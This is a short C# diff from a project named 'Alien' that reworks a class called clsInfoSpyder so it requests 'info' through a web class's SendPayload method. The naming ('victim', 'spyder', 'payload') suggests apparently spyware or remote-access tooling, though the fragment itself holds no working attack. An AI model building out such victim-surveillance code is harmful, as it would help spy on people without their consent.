@@ -6,18 +6,20 @@ using System.Threading.Tasks;
 
 namespace Alien
 {
-    internal class clsInfoSpyder : clsWeb
+    internal class clsInfoSpyder
     {
-        public clsInfoSpyder(clsVictim victim) : base(victim)
+        private clsWeb m_web { get; set; }
+
+        public clsInfoSpyder(clsWeb web)
         {
-            m_victim = victim;
+            m_web = web;
         }
 
-        public string fnszGetInfo()
+        public async Task<string> fnszGetInfo()
         {
             try
             {
-                return string.Empty;
+                return await m_web.fnszSendPayload("info");
             }
             catch (Exception ex)
             {
